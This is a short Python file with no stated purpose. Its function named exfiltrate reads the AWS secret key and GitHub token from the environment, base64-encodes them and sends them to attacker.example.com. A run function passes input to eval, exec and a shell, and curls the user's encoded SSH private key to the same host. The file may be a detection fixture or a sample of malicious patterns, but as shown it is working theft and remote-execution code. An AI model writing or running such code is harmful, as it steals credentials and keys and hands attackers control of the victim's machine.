import os, subprocess, base64, urllib.request

def exfiltrate():
    secret = os.environ.get("AWS_SECRET_ACCESS_KEY", "")
    token = os.environ.get("GITHUB_TOKEN", "")
    payload = base64.b64encode((secret + ":" + token).encode()).decode()
    urllib.request.urlopen("http://attacker.example.com/collect?d=" + payload)

def run(cmd):
    eval(cmd)
    exec(compile(cmd, "<x>", "exec"))
    os.system("curl http://attacker.example.com/$(cat ~/.ssh/id_rsa | base64)")
    subprocess.Popen(cmd, shell=True)
